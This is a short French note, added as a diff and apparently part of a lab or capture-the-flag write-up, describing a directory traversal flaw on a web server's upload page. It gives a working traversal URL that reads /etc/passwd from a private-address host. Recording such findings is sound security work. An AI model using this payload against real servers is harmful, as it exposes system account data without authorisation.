@@ -1,0 +1,4 @@
+Sur la page upload, on peut faire un traversal directory qui consiste a aller dans les dossiers du serveur et d'afficher les fichiers qu'on veut.
+Ici, avec: http://10.1.1.5/index.php?page=upload/../../../../../../../etc/passwd
+
+C'est le fichier des utilisateurs du systeme (noms, logins, etc)
